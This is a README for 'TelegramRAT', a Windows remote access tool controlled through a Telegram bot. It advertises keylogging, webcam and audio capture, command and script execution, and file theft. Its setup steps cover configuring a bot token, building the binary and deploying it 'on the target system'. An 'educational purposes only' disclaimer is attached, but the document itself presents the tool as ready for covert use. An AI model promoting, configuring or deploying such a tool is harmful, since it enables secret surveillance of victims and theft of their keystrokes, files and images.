# TelegramRAT

**Telegram Remote Access Tool**  
A modern and optimized administration tool for Windows, accessible via your personal Telegram bot. Built for educational and administrative purposes, this tool offers robust features to interact with and control Windows systems remotely.

## Features

- **Keyboard and Mouse Input Simulation**
- **File System Access**
  - Upload, download, delete, and manage files.
- **CMD Command Execution**
- **Python Scripting**
  - Execute Python scripts directly.
- **Audio and Video**
  - Record audio and capture webcam photos.
- **System Control**
  - Shutdown, restart, logoff, monitor power control, etc.
- **Monitoring**
  - Keylogging (educational use only).
- **Miscellaneous**
  - Screenshot capturing, URL opening, and more.

For a full list of available commands, use the `/commands` bot command or click on the `Show All Commands` button.

## Requirements

- **Platform:** Windows 7+
- **Framework:** .NET 8
- **Telegram Bot:** Create one [here](https://core.telegram.org/bots).

## Improvements Over the Original

This version is based on the [Garneg's TelegramRAT](https://github.com/Garneg/TelegramRAT), with significant enhancements:
- Updated to **.NET 8** for better performance and support.
- Optimized and refactored the entire codebase.
- Improved stability and error handling.
- Enhanced security practices.
- Streamlined the command architecture for easier extension.
- Updated all the third-party libraries.

## Setup

1. Clone the repository:
   ```bash
   git clone https://github.com/XeinTDM/TelegramRAT.git
   ```
2. Configure your bot token and owner ID in `Program.cs`:
   ```csharp
   private static readonly string BotToken = "YOUR_TELEGRAM_BOT_TOKEN";
   private static readonly long? OwnerId = null;
   ```
3. Build the project using Visual Studio or any compatible IDE.
4. Deploy the compiled binary on the target system.
5. Start the application and control it through your Telegram bot.

## License

This project is licensed under the [The Unlicense](LICENSE), granting you the freedom to use, modify, and distribute the code as you see fit.

## Disclaimer

> **This tool is for educational and ethical purposes only.**  
> Using this software maliciously or in violation of any laws is strictly prohibited.  
> **The author is not responsible for any misuse or damage caused by this code.**  
> Ensure you have proper authorization before using this tool on any system.

By using this tool, you agree to take full responsibility for your actions.
